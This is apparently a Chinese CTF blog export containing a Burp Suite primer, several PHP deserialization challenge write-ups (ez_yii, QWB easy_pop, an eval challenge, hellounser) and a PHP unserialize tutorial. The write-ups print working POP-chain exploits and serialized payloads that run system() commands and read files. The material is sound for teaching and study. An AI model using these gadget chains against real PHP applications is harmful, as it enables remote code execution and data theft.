History中翻找，还是不够方便，这时候就需要Repeater了\nRepeater还是回到刚刚抓上包的地方，这次我们选择右键-&gt;发送到Repeater\n\n这时候我们在Repeater中点击发送就能在右半部分看到回显，也可以使用页面渲染预览回显的页面\n\n这时候再需要修改请求，就不需要回到浏览器中再次抓包了，直接在Repeater中修改请求体即可\n\nIntruder这里我们用test_ur_payload来做演示，和刚才一样，使用内嵌浏览器访问并抓包，这次用右键发送到Intruder\n\n这里一共有四种攻击方式：Sniper，Battering，Pitchfork，Clusterbomb，在下方可以用§来限制payload的位置\n\n在payload处可以选择攻击使用的payload参数，包括类型，输入值，处理方法、编码等，点击开始攻击就能进行爆破\n\nExtension在扩展中可以添加如Fastjsonscan，Autorize，jython等插件，可能某些题需要在这对bp进行修改\nHomework\nTest_ur_bp\n\n","categories":["CTF"],"tags":["CTF","WEB","Burpsuite"]},{"title":"PHP反序列化-[祥云杯2021 ez_yii]","url":"/2023/03/22/ez-yii/","content":"ez_yii [祥云杯2021]Analyze先上题\nindex.php\n&lt;?phpinclude(\"closure/autoload.php\");function myloader($class){    require_once './class/' . (str_replace('\\\\', '/', $class) . '.php');}spl_autoload_register(\"myloader\"); error_reporting(0);if($_POST['data']){    unserialize(base64_decode($_POST['data']));}else{\techo \"&lt;h1&gt;某ii最新的某条链子&lt;/h1&gt;\";}\nautoload.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */require_once 'functions.php';spl_autoload_register(function($class){       $class = ltrim($class, '\\\\');    $dir = __DIR__ . '/src';    $namespace = 'Opis\\Closure';        if(strpos($class, $namespace) === 0)    {        $class = substr($class, strlen($namespace));        $path = '';        if(($pos = strripos($class, '\\\\')) !== FALSE)        {            $path = str_replace('\\\\', '/', substr($class, 0, $pos)) . '/';            $class = substr($class, $pos + 1);        }        $path .= str_replace('_', '/', $class) . '.php';        $dir .= '/' . $path;                if(file_exists($dir))        {            include $dir;            return true;        }                return false;    }        return false;});\nfunctions.php\n&lt;?php/* =========================================================================== * Copyright (c) 2018-2019 Zindex Software * * Licensed under the MIT License * =========================================================================== */namespace Opis\\Closure;/** * Serialize * * @param mixed $data * @return string */function serialize($data){    SerializableClosure::enterContext();    SerializableClosure::wrapClosures($data);    $data = \\serialize($data);    SerializableClosure::exitContext();    return $data;}/** * Unserialize * * @param string $data * @param array|null $options * @return mixed */function unserialize($data, array $options = null){    SerializableClosure::enterContext();    $data = ($options === null || \\PHP_MAJOR_VERSION &lt; 7)        ? \\unserialize($data)        : \\unserialize($data, $options);    SerializableClosure::unwrapClosures($data);    SerializableClosure::exitContext();    return $data;}\nRunProcess.php\n&lt;?phpnamespace Codeception\\Extension;class RunProcess{    protected $output;    protected $config = ['sleep' =&gt; 0];    protected static $events = [];    private $processes = [];    public function __destruct()#1    {        $this-&gt;stopProcess();    }    public function stopProcess()#2    {        foreach (array_reverse($this-&gt;processes) as $process) {            if (!$process-&gt;isRunning()) {                continue;            }            $this-&gt;output-&gt;debug('[RunProcess] Stopping ' . $process-&gt;getCommandLine());            $process-&gt;stop();        }        $this-&gt;processes = [];    }}\nDefaultGenerator.php\n&lt;?phpnamespace Faker;class DefaultGenerator{    protected $default;    public function __call($method, $attributes)    {           echo \"def\";        return $this-&gt;default;    }}\nAppendStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class AppendStream{    private $streams = [];#-7    private $seekable = true;    public function __toString()    {        $this-&gt;rewind();        return \"hahaha\";    }    public function rewind()    {        $this-&gt;seek(0);    }    public function seek($offset, $whence = SEEK_SET)    {        echo\"4\";        if (!$this-&gt;seekable) {            throw new \\RuntimeException('This AppendStream is not seekable');        } elseif ($whence !== SEEK_SET) {            throw new \\RuntimeException('The AppendStream can only seek with SEEK_SET');        }        $this-&gt;pos = $this-&gt;current = 0;        // Rewind each stream        foreach ($this-&gt;streams as $i =&gt; $stream) {            try {                $stream-&gt;rewind();#-6            } catch (\\Exception $e) {                throw new \\RuntimeException('Unable to seek stream '                    . $i . ' of the AppendStream', 0, $e);            }        }    }}\nCachingStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class CachingStream{    private $remoteStream;    private $skipReadBytes = 0;    public function rewind()#-5    {        $this-&gt;seek(0);    }    public function seek($offset)#-4    {        $byte = $offset;        $diff = $byte - $this-&gt;stream-&gt;getSize();        if ($diff &gt; 0) {            // Read the remoteStream until we have read in at least the amount            // of bytes requested, or we reach the end of the file.            while ($diff &gt; 0 &amp;&amp; !$this-&gt;remoteStream-&gt;eof()) {                $this-&gt;read($diff);                $diff = $byte - $this-&gt;stream-&gt;getSize();            }        } else {            // We can just do a normal seek since we've already seen this byte.            $this-&gt;stream-&gt;seek($byte);        }    }    public function read($length)    {        // Perform a regular read on any previously read data from the buffer        $data = $this-&gt;stream-&gt;read($length);        $remaining = $length - strlen($data);        // More data was requested so read from the remote stream        if ($remaining) {            // If data was written to the buffer in a position that would have            // been filled from the remote stream, then we must skip bytes on            // the remote stream to emulate overwriting bytes from that            // position. This mimics the behavior of other PHP stream wrappers.            $remoteData = $this-&gt;remoteStream-&gt;read(#-3                $remaining + $this-&gt;skipReadBytes            );            if ($this-&gt;skipReadBytes) {                $len = strlen($remoteData);                $remoteData = substr($remoteData, $this-&gt;skipReadBytes);                $this-&gt;skipReadBytes = max(0, $this-&gt;skipReadBytes - $len);            }            $data .= $remoteData;            $this-&gt;stream-&gt;write($remoteData);        }        return $data;    }}\nPumpStream.php\n&lt;?phpnamespace GuzzleHttp\\Psr7;class PumpStream{    private $source;    private $size;    private $tellPos = 0;    private $metadata;    private $buffer;    public function getSize()    {        return $this-&gt;size;    }    public function read($length)#-2    {        $data = $this-&gt;buffer-&gt;read($length);        $readLen = strlen($data);        $this-&gt;tellPos += $readLen;        $remaining = $length - $readLen;        if ($remaining) {            $this-&gt;pump($remaining);            $data .= $this-&gt;buffer-&gt;read($remaining);            $this-&gt;tellPos += strlen($data) - $readLen;        }        return $data;    }    private function pump($length)#-1    {        if ($this-&gt;source) {            do {                $data = call_user_func($this-&gt;source, $length);                if ($data === false || $data === null) {                    $this-&gt;source = null;                    return;                }                $this-&gt;buffer-&gt;write($data);                $length -= strlen($data);            } while ($length &gt; 0);        }    }}\n这次的代码比较多，需要进行一点点剖析\n进行逆向分析：\n首先观察到在PumpStream.php中存在函数call_user_func()，可以考虑利用，往上逐个观察，函数call_user_func()在函数pump()中，再次往上，函数read()在if($remaining)的条件下会调用函数pump()\n全局搜索函数read()，在CachingStream.php中找到了同名函数read()，可以将其作为跳板，而在函数seek()中，调用了函数read()，又在函数rewind()中被调用\n再次全局搜索函数rewind()，在AppendStream.php中找到了同名函数rewind()，又可以作为跳板\n进行正向分析：\n在RunProcess.php中，函数__destruct()调用了函数stopProcess()，可以联想到使用函数__call()，发现在DefaultGenerator.php中，发现还需要一个函数__toString()，可以在AppendStream.php中找到\n正向逆向分析完成，可以得到如下POP链\n// RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()\nPOC&lt;?php // RunProcess-&gt;__destruct()-&gt;stopProcess()// -&gt;DefaultGenerator-&gt;__call()// -&gt;AppendStream-&gt;__toString()-&gt;rewind()-&gt;seek()// -&gt;CachingStream-&gt;rewind()-&gt;seek()-&gt;read()// -&gt;PumpStream-&gt;read()-&gt;pump()-&gt;call_user_func()namespace Codeception\\Extension{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    use GuzzleHttp\\Psr7\\PumpStream;    class RunProcess    {        protected $output;        private $processes = ['aaa'=&gt;1];        public function __construct($def=0)        {            echo \"runprocess~~~~~~~~~~~~~~~~~~\";            $this-&gt;output=$def;            $this-&gt;processes['aaa']=$def;                    }    }    $pum=new PumpStream;    $cac=new CachingStream($pum);    $app=new AppendStream($cac);    $def=new DefaultGenerator($app);    $run=new RunProcess($def);    $payload = serialize($run);    echo base64_encode($payload);}namespace Faker{    use GuzzleHttp\\Psr7\\AppendStream;    use GuzzleHttp\\Psr7\\CachingStream;    class DefaultGenerator    {        protected $default;        public function __construct($app=0)        {            echo \"faker~~~~~~~~~~~~~~~~~~\";            $this-&gt;default = $app;        }    }}namespace GuzzleHttp\\Psr7{    class AppendStream    {        private $streams=[];        public function __construct($cac=0)        {            echo \"appengstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;streams[]=$cac;        }    }}namespace GuzzleHttp\\Psr7{    use Faker\\DefaultGenerator;    use GuzzleHttp\\Psr7\\PumpStream as Psr7PumpStream;    class CachingStream    {        private $remoteStream;        public function __construct($pum=0)        {            echo \"cachingstream~~~~~~~~~~~~~~~~~~\";            $this-&gt;stream=$pum;            $this-&gt;remoteStream=new DefaultGenerator(NULL);        }    }    class PumpStream    {        private $source;        private $size;        private $tellPos = 0;        private $metadata;        private $buffer;        public function __construct()        {            echo \"pumpstream~~~~~~~~~~~~~~~~~~\";            include(\"closure/autoload.php\");            $this-&gt;size=-1;            $def=new DefaultGenerator('aaaaaa');            $this-&gt;buffer=new CachingStream($def);            $fun=function()            {                system(\"cd / &amp;&amp; cat flag\");            };            $f=(\\Opis\\Closure\\serialize($fun));            $this-&gt;source=unserialize($f);        }    }}\n反序列化后对data进行POST传参即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"PHP反序列化-[QWB 2021]","url":"/2023/03/12/easy-pop/","content":"easy_pop ([QWB 2021] - 赌徒)Analyze进一下端口，只得到I think you need /etc/hint . Before this you need to see the source code，下载一下备份文件/www.zip，得到index.php\n#index.php&lt;meta charset=\"utf-8\"&gt;&lt;?php//hint is in hint.phperror_reporting(1);class Start{    public $name='guest';    public $flag='syst3m(\"cat 127.0.0.1/etc/hint\");';\t    public function __construct(){        echo \"I think you need /etc/hint . Before this you need to see the source code\";    }    public function _sayhello(){        echo $this-&gt;name;        return 'ok';    }    public function __wakeup(){        echo \"hi\";        $this-&gt;_sayhello();    }    public function __get($cc){        echo \"give you flag : \".$this-&gt;flag;        return ;    }}class Info{    private $phonenumber=123123;    public $promise='I do';\t    public function __construct(){        $this-&gt;promise='I will not !!!!';        return $this-&gt;promise;    }    public function __toString(){        return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee'];    }}class Room{    public $filename='/flag';    public $sth_to_set;    public $a='';\t    public function __get($name){        $function = $this-&gt;a;        return $function();    }\t    public function Get_hint($file){        $hint=base64_encode(file_get_contents($file));        echo $hint;        return ;    }    public function __invoke(){        $content = $this-&gt;Get_hint($this-&gt;filename);        echo $content;    }}if(isset($_GET['hello'])){    unserialize($_GET['hello']);}else{    $hi = new  Start();}?&gt;\n从代码中分析可以看出，给hello传参，然后进行序列化攻击。通过对魔术方法和序列化的的学习，我们只能从Start这个类开始下手，当对这个该类进行反序列化时，会自动执行wakeup()方法，而这3个类中只有Start类存在这个方法。再继续观察发现，我们最终需要达到的目的地是Room类的Get_hint()方法。\n所以可以构造payload：\n&lt;?phpinclude \"index.php\";$a = new Start();\t\t\t// __wakeup()进入，$a-&gt;name = new Info();\t\t// Info的__toString()进入$a-&gt;name-&gt;file[\"filename\"] = new Room();\t// Room的__get()进入$a-&gt;name-&gt;file[\"filename\"]-&gt;a= new Room();\t// Room的__invoke()进入echo \"&lt;br&gt;\";echo serialize($a);?&gt;\n序列化后可以得到O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"Infophonenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\n反序列化的结果是一片空白，再仔细查看payload发现是Infophonenumber出现了问题，添加上%00即可\n完整payload：/?hello=O:5:\"Start\":2:{s:4:\"name\";O:4:\"Info\":3:{s:17:\"%00Infop%00honenumber\";i:123123;s:7:\"promise\";s:15:\"I will not !!!!\";s:4:\"file\";a:1:{s:8:\"filename\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";O:4:\"Room\":3:{s:8:\"filename\";s:5:\"/flag\";s:10:\"sth_to_set\";N;s:1:\"a\";s:0:\"\";}}}}s:4:\"flag\";s:33:\"syst3m(\"cat 127.0.0.1/etc/hint\");\";}\n将得到的结果Base64解码后即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"PHP反序列化-eval()","url":"/2023/03/13/ez_unserialize/","content":"ez_unserializeAnalyze先上题：\n&lt;?phperror_reporting(0);highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class = 'info';    public function __construct(){        $this-&gt;class=new info();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code;    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    $user-&gt;login($username,$password);}\n先找到反序列化的地方$user = unserialize($_COOKIE['user']);，所以是对user进行cookie注入，可以使用cookie editor等插件\n观察到evil类中有eval()函数，其作用是将字符串参数当做代码来执行，所以可以在这里进行攻击\nUser类的构造函数会生成一个新的对象，所以可以在这里改为$this-&gt;class=new evil();\nEXP#payload&lt;?phperror_reporting(0);// highlight_file(__FILE__);class User{    private $username='name';    private $password='password';    private $class;    public function __construct(){        $this-&gt;class=new evil();    }    public function login($u,$p){        if($this-&gt;username===$u&amp;&amp;$this-&gt;password===$p){            echo \"successfully login\";        }    }    public function __destruct(){        $this-&gt;class-&gt;getInfo();    }}class info{    private $user='xxxxxx';    public function getInfo(){        return $this-&gt;user;    }}class evil{    private $code=\"system('cat flag.php');\";    public function getInfo(){        eval($this-&gt;code);    }}$username=$_GET['username'];$password=$_GET['password'];if(isset($username) &amp;&amp; isset($password)){    $user = unserialize($_COOKIE['user']);    $user-&gt;login($username,$password);}$a=new User();echo(urlencode(serialize($a)));?&gt;    #output(cookie)user=O%3A4%3A%22User%22%3A3%3A%7Bs%3A14%3A%22%00User%00username%22%3Bs%3A4%3A%22name%22%3Bs%3A14%3A%22%00User%00password%22%3Bs%3A8%3A%22password%22%3Bs%3A11%3A%22%00User%00class%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D/?username=name&amp;password=password\n即可得到flag\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"Hello World","url":"/2021/05/01/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\nMore info: Writing\nRun server$ hexo server\nMore info: Server\nGenerate static files$ hexo generate\nMore info: Generating\nDeploy to remote sites$ hexo deploy\nMore info: Deployment\n","categories":["Hello world"],"tags":["Hello world"]},{"title":"PHP反序列化-hellounser","url":"/2023/03/22/hellounser/","content":"hellounser [DASCTF 2021 Sept]Analyze先上题\n&lt;?phpclass A {    public $var;    public function show(){        echo $this-&gt;var;    }    public function __invoke(){        $this-&gt;show();    }}class B{    public $func;    public $arg;        public function show(){        $func = $this-&gt;func;        if(preg_match('/^[a-z0-9]*$/isD', $this-&gt;func) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\\`|\\{|\\%|x|\\&amp;|\\$|\\*|\\||\\&lt;|\\\"|\\'|\\=|\\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\\.|log/i', $this-&gt;arg)) {             die('No!No!No!');         } else {             include \"flag.php\";            //There is no code to print flag in flag.php            $func('', $this-&gt;arg);         }    }        public function __toString(){        $this-&gt;show();        return \"&lt;br&gt;\".\"Nice Job!!\".\"&lt;br&gt;\";    }        }if(isset($_GET['pop'])){    $aaa = unserialize($_GET['pop']);    $aaa();}else{    highlight_file(__FILE__);}?&gt;\n稍加分析，在类B中，函数show()包含了flag.php，而函数__toString()调用了函数show()，\n\n__toString()：类被当成字符串时的回应方法\n\n而在类A中，函数show()会输出字符串var，那么我们可以将var定义为B的对象，而类A中的函数show()又被函数__invoke()调用\n\n__invoke()：调用函数的方式调用一个对象时的回应方法\n\nPOP链清晰了，那么现在就看看如何获取flag，很显然，我们既不能满足preg_match('/^[a-z0-9]*$/isD', $this-&gt;func)，又不能满足preg_match('...', $this-&gt;arg)，前一个正则表达式限制了func不能为纯字母或数字，i为不区分大小写，s为匹配任何不可见字符，包括空格、制表符、换页符…，等价于[fnrtv]，D为如果使用$限制结尾字符,则不允许结尾有换行，而后一个则是普通的字符过滤。\n在这里可以考虑使用函数create_function()\n\nfcreate_function()：会创造一个匿名函数 （lambda样式），且会在内部调用函数eval()\n\n进行代码注入：return(1);}???;//\n随后进行简单的绕过即可\nPOC&lt;?phpclass A {    public $var;    public function show()    {        echo $this-&gt;var;    }    public function __invoke()    {        $this-&gt;show();    }}class B{    public $func;    public $srg;    public function __toString()    {        $this-&gt;show();    }}$a=new A();$b=new B();$ac=(~('php://filter/read=convert.base64-encode/resource=Tru3flag.php'));$b-&gt;func=\"create_function\";$b-&gt;arg='return(1);}require(~('.strval($ac).'));//';$a-&gt;var=$b;echo urlencode(serialize($a));\n","categories":["CTF"],"tags":["CTF","WEB","PHP unserialize"]},{"title":"php-unserialize","url":"/2023/11/12/php-unserialize/","content":"Unserialize IntroInstallationWindows在PHP官网上下载Zip\n\ndownload link: https://windows.php.net/download#php-8.2\n\n解压安装包，将解压后的目录路径加入环境变量PATH中，安装完成后可以使用php -v来查询\nLinuxUse Apachesudo apt updatesudo apt install php libapache2-mod-php# 安装完成后，需要重启Apache来重新加载phpsudo systemctl restart apache2\nUse Nginx不像Apache，Nginx没有对处理PHP文件的内建支持。我们要使用PHP-FPM (“fastCGI process manager”)来处理PHP文件。\nsudo apt updatesudo apt install php-fpm# 安装完成，FPM 服务将会自动启动# 检查服务状态systemctl status php7.4-fpm# 然后对Nginx进行配置# 添加以下内容来让Nginx处理PHP文件server {    # ...    location ~ \\.php$ {        include snippets/fastcgi-php.conf;        fastcgi_pass unix:q;    }}# 重启Nginx来使新配置生效sudo systemctl restart nginx\n除了上述的这些方法，诸如PhpStorm，phpstudy，VSC extensions等等工具也是不错的选择\n当然，也可以使用Docker\nClass &amp; Object在学习PHP Unserialize Attack之前，首先需要对PHP本身有所了解。PHP是一种面向对象的语言，和其他面向对象的语言一样，\n\n对象是一个由信息及对信息进行处理的描述所组成的整体，是对现实世界的抽象。\n\n类是一个共享相同结构和行为的对象的集合。\n\n\n在PHP中，类内的属性或方法也有private，protected，public，三种访问权限\n\nprivate：私有的 , 类内自身可访问\nprotected：受保护的 , 类内自身 , 其子类和父类可以访问\npublic：公开的 , 任何地方都可以访问\n\n举一个例子\n&lt;?phpclass Cargo{    public $id;    protected $price;    private $weight;        public function __construct(){        $this-&gt;id = 114;        $this-&gt;price = 514;        $this-&gt;weight = 1919810;    }}$cargo = new Cargo;var_dump($cargo); // var_dump()方法是判断一个变量的类型与长度，并输出变量的数值，如果变量有值输的是变量的值并回返数据类型?&gt;    // outputobject(Cargo)#1 (3) {  [\"id\"]=&gt;  int(114)  [\"price\":protected]=&gt;  int(514)  [\"weight\":\"Cargo\":private]=&gt;  int(1919810)}\nWhat is Serialize &amp; Unserialize?由于传递对象十分麻烦，所以便诞生了序列化，在PHP中，我们可以使用serialize()来将一个对象转化成字符串，方便我们进行对象的传递。\n举个例子\n&lt;?phpclass Cargo{    public $id;    public $name;        public function __construct(){        $this-&gt;id = 114514;        $this-&gt;name = 1919810;    }}$cargo = new Cargo;echo serialize($cargo);?&gt;// outputO:5:\"Cargo\":2:{s:2:\"id\";i:114514;s:4:\"name\";i:1919810;}\n我们来详细解释一下这个字符串\n\nO:5:\"Cargo\":3：O表示是一个对象，5表示类名的长度，Cargo是类名，3代表在Cargo这个类中有三个属性，而这三个属性也是后面{}之中的内容\n{s:2:\"id\";i:114;s:8:\"price\";i:514;s:13:\"Cargoweight\";i:1919810;}：不同的属性之间用;隔开，s:2:\"id\";i:114代表这个属性名长度为2，属性名为id，而其内容是int类型的114\n\n有序列化也同样会有反序列化，我们可以使用unserialize()来将一个字符串反序列化为一个对象\n&lt;?phpclass Cargo{    public $id;    public $name;        public function __construct(){        $this-&gt;id = 114514;        $this-&gt;name = 1919810;    }}$string = 'O:5:\"Cargo\":2:{s:2:\"id\";i:114514;s:4:\"name\";i:1919810;}';$obj = unserialize($string);var_dump($obj);?&gt;// outputobject(Cargo)#1 (2) {  [\"id\"]=&gt;  int(114514)  [\"name\"]=&gt;  int(1919810)}\nMagic Functions\n魔术方法是一种特殊的方法，当对对象执行某些操作时会覆盖 PHP 的默认操作。\nReference Link: https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup\n\n魔术方法一共有如下这些\n__construct()\t// 类的构造函数，创建对象时触发__destruct()    // 类的析构函数，对象被销毁时触发__call()        // 在对象上下文中调用不可访问的方法时触发__callStatic()  // 在静态上下文中调用不可访问的方法时触发__get()         // 读取不可访问属性的值时，这里的不可访问包含私有属性或未定义__set()         // 在给不可访问属性赋值时触发__isset()       // 当对不可访问属性调用isset()或empty()时触发__unset()       // 在不可访问的属性上使用unset()时触发__sleep()       // 执行serialize()时，先会调用这个方法__wakeup()      // 执行unserialize()时，先会调用这个方法__serialize()   // __unserialize() // __toString()    // 把类当作字符串使用时触发__invoke()      // 当尝试以调用函数的方式调用一个对象时触发__set_state()   // 调用var_export()导出类时，此静态方法会被调用。__clone()       // 当对象复制完成时调用__debuginfo()   // 打印调试信息\n有一些注意事项：\n\n除了__construct()，__destruct()，和 __clone()之外的所有魔术方法都必须 声明为public，否则会发出E_WARNING。在PHP 8.0.0之前没有为魔术方法__sleep()、__wakeup()，__serialize()，__unserialize()，__set_state()发出诊断信息。\n\n__construct()，__destruct()不能声明返回类型，不然会返回Fatal Error\n\n\n__sleep() &amp; __wakeup()我们先看一下下面这个例子\n&lt;?phpclass Cargo{    private $secret;    protected $hidden;    public $name;        public function __construct(){        $this-&gt;secret = 114514;        $this-&gt;hidden = 1919810;        $this-&gt;name = \"zako\";    }}$cargo = new Cargo;echo serialize($cargo);?&gt;// outputO:5:\"Cargo\":3:{s:13:\"Cargosecret\";i:114514;s:9:\"*hidden\";i:1919810;s:4:\"name\";s:4:\"zako\";}\n我们会发现，在序列化的过程中，类内的private和protected属性也被序列化了，如果我们不希望某些属性在序列化时被暴露出来，就可以借用__sleep()方法\n\n__sleep()方法是PHP中的一个魔术方法，用于在对象被序列化时触发。在__sleep()中，我们可以指定哪些属性需要被序列化，哪些属性不需要被序列化。具体来说，当调用serialize()函数将一个对象序列化时，PHP会先自动调用对象的__sleep()方法，该方法需要返回一个数组，包含需要被序列化的属性名。然后PHP会将这些属性序列化成字符串。\n\n&lt;?phpclass Cargo{    private $secret;    protected $hidden;    public $name;    public function __construct(){        $this-&gt;secret = 114514;        $this-&gt;hidden = 1919810;        $this-&gt;name = \"zako\";    }    public function __sleep(){\t// 在这里，我们添加__sleep()，并让它返回一个仅包含\"name\"的数组        return array(\"name\");    }}$cargo = new Cargo;echo serialize($cargo);?&gt;// outputO:5:\"Cargo\":1:{s:4:\"name\";s:4:\"zako\";}\t// 可以看到，此时序列化之后的字符串中就不会包括我们不想暴露的\"secret\"和\"hidden\"了\n显然，睡着了需要醒过来（bushi\n\n在对字符串进行反序列化时会检查是否存在一个__wakeup()方法。如果存在，则会先调用__wakeup()方法，预先准备对象需要的资源 而__wakeup() 用于在从字符串反序列化为对象时自动调用。\n__wakeup() 方法的作用是对一个对象进行一些必要的初始化操作。例如，如果一个对象中包含了一些需要进行身份验证的属性，那么在从字符串反序列化为对象时，就可以在 __wakeup() 方法中进行身份验证。或者如果一个对象中包含了一些需要在每次初始化时计算的属性，也可以在 __wakeup() 方法中进行计算\n\n__toString()\n__toString()方法用于一个类被当成字符串时应怎样回应，此方法必须返回一个字符串\n\n其实，__toString()方法被触发的情况很多\n\necho($obj), print($obj)\n反序列化对象与字符串拼接\n反序列化对象参与格式化字符串\n反序列化对象与字符串进行值相同（==）比较\n反序列化对象参与格式化SQL语句，绑定参数\n反序列化对象被用于字符串处理函数\nstrlen()，strcmp()\n需要格外注意，正则判断preg_match()也会触发\n\n\n在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串\n反序列化对象作为class_exists()的参数\n\n举个例子，这次招新赛的！动启，案档蓝蔚\nclass Blue{    public $source;    public $str;        public function __toString(){        return $this-&gt;str-&gt;source;    }}class Printer{    public $content;        public function __construct($content=\"还想找大叔玩？&lt;br&gt;\"){        echo \"word count:\".strlen($content);        $this-&gt;content=$content;        $this-&gt;print();    }}\n在这里就是通过Printer类的__construct()方法，将$content传参一个Blue类的对象，从而通过strlen()触发__toString()\n__get() &amp; __set()\n读取不可访问（protected 或 private）或不存在的属性的值时，__get()会被调用。\n在给不可访问（protected 或 private）或不存在的属性赋值时，__set()会被调用。\n\n还是参照这次招新赛的！动启，案档蓝蔚\nclass Archive {    protected $game;        public function __get($obj){        $this-&gt;launch($this-&gt;game);        return \"&lt;br&gt;hi&lt;br&gt;\";    }}class Blue{    public $source;    public $str;    public function __construct($welcome='蔚蓝档案启动器！&lt;br&gt;'){        $this-&gt;source = $welcome;        echo '欢迎来到'.$this-&gt;source.\"&lt;br&gt;\";    }    public function __toString(){        return $this-&gt;str-&gt;source;    }}\n在这里就是通过Blue类的__toString()方法，将$this-&gt;str传参一个Archive类的对象，调用其不存在的source属性来触发__get()\nTriggering Sequence我们用下面这个简单的例子来看一下序列化与反序列化过程中，魔术方法的触发顺序\n&lt;?phphighlight_file(__FILE__);class Cargo{    public $secret = \"hi\";    public $dump = \"dump\";    public function __construct()    {        echo \"construct&lt;br&gt;\";    }    public function __destruct()    {        echo \"destruct&lt;br&gt;\";    }    public function __call($name, $arguments)    {        echo \"call&lt;br&gt;\";    }    public static function __callStatic($name, $arguments)    {        echo \"callStatic&lt;br&gt;\";    }    public function __get($name)    {        echo \"get&lt;br&gt;\";    }    public function __set($name, $value)    {        echo \"set&lt;br&gt;\";    }    public function __isset($name)    {        echo \"isset&lt;br&gt;\";    }    public function unset()    {        echo \"unset&lt;br&gt;\";    }    public function __sleep()    {        echo \"sleep&lt;br&gt;\";        return array(\"dump\");    }    public function __wakeup()    {        echo \"wakeup&lt;br&gt;\";    }    public function __toString()    {        echo \"toString&lt;br&gt;\";        return \"toString\";    }    public function __invoke()    {        echo \"invoke&lt;br&gt;\";    }    public static function __set_state($properties)    {        echo \"set_state&lt;br&gt;\";    }    public function __clone()    {        echo \"clone&lt;br&gt;\";    }    public function __debugInfo()    {        echo \"debugInfo&lt;br&gt;\";    }}echo \"&lt;br&gt;Serialize:&lt;br&gt;\";$cargo = new Cargo;$str = serialize($cargo);echo $str;echo \"&lt;br&gt;Unserialize:&lt;br&gt;\";var_dump(unserialize($str));?&gt;\noutput:\n\n很显然，在序列化的过程中，依次触发了__construct()和__sleep()；而在反序列化的过程中，依次触发了__wakeup()，__debugInfo()和destruct()。最后多了一次destruct的输出是由于我们之前在序列化过程中创建的cargo对象在运行结束后也要进行一次析构函数的运行\nEz Bypass对于一些简单的题目，可能只利用了某些魔术方法的漏洞，并不需要进行pop链的构造\n__wakeup() Bypass\nPHP5 &lt;5.6.25, PHP7 &lt; 7.0.10\n如果类中存在__wakeup()方法，调用unserilize()方法前则先调用__wakeup()方法，当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行\n\n__destruct() Garbage Collection先看看这个\n&lt;?phphighlight_file(__FILE__);class Cargo{    public $secret;    public function __destruct()    {        eval($this-&gt;secret);    }}if(isset($_GET['str'])){    $a=unserialize($_GET['str']);    throw new Error(\"zako\");}?&gt;\n当我们构造序列化字符串O:5:\"Cargo\":1:{s:6:\"secret\";s:13:\"system('ls');\";}并传参时，就会得到以下结果\n\n这是由于__destruct()是当某个对象成为垃圾或者当对象被显式销毁时执行\n\n显式销毁，当对象没有被引用时就会被销毁,所以我们可以unset或为其赋值NULL隐式销毁，PHP是脚本语言,在代码执行完最后一行时,所有申请的内存都要释放掉\n\n在常规思路中__destruct()是隐式销毁触发的，所以我们要强行使用GC (Garbage Collection)\nWhat is Garbage 